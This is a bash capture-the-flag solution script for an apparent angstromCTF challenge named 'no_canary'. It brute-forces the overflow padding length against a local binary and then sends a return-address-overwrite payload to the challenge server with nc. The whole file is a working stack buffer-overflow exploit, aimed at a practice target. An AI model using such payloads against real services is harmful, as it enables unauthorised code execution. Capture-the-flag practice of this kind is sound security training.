#!/bin/bash
if ! [ -f ./no_canary ]
then echo 'please put ./no_canary in the current directory!'
fi
echo 'actf{...}' > flag.txt
pad() { python -c "print $1*'a' + '\x86\x11\x40\x00\x00\x00\x00\x00'"; }
for i in `seq 1 100`
do  if pad $i| ./no_canary | grep -q actf
    then    break
    fi
done
rm flag.txt
pad $i | nc shell.actf.co 20700 | grep actf
